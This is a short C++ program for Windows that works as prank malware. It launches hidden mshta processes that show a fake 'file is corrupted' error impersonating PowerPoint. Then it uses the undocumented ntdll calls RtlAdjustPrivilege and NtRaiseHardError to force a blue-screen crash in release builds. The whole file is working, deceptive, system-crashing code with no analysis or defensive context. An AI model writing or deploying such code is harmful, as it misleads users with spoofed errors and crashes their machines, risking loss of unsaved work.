#include <iostream>
#include <Windows.h>
#include <winternl.h>


typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

int main()
{
    // Too lazy to make multiple threads showing multiple message boxes at the same time.
    const wchar_t command[] = L"mshta";	
    const wchar_t arguments[] = L"vbscript:MsgBox(\"The file is corrupted!\",16,\"PowerPoint\")(window.close)";
    for (int i=0; i<10; ++i) {
	    ShellExecuteW(NULL, L"open", command, arguments, NULL, SW_HIDE);
    }
    Sleep(1000); // Wait for the message boxes to display
    
    LPVOID lpFuncAddress = (void *)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = (void *)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
    [[maybe_unused]] pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    [[maybe_unused]] pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;

    // Disable BSOD in debug builds. 
    #ifdef NDEBUG
        BOOLEAN bEnabled;
        ULONG uResp;
        // Enables shutdown privilage for the current proccess. Required for the next call.
	    [[maybe_unused]] NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
        /* 
        Send a hard error message and cause a bsod. 
        Check http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtRaiseHardError.html
        for more details.
        */
        NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
    #else
        std::cout << "BSOD NOW!";
    #endif

    return 0;
}